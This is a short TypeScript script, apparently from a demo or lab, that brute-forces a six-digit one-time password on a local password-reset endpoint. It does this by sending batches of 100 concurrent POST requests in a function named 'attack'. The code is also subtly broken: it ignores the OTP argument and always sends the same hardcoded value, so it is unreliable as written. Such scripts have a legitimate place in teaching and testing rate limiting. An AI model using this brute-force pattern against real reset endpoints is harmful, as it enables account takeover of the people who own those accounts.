import axios from "axios";

const email: string = "putYourEmailHere";

const sendRequest = async (otp: string) => {
  let data = JSON.stringify({
    email: email,
    otp: "437234",
    newPassword: "fbdhjsdh",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  await axios
    .request(config)
    .then((response) => {
      console.log(JSON.stringify(response.data));
    })
    .catch((error) => {
      console.log(error.response.data);
    });
};

const attack = async () => {
  for (let i = 100000; i < 999999; i += 100) {
    const promise: Promise<void>[] = [];
    console.log(i);
    for (let j = 0; j < 100; j++) {
      promise.push(sendRequest((i + j).toString()));
    }
    await Promise.all(promise);
  }
};

attack();
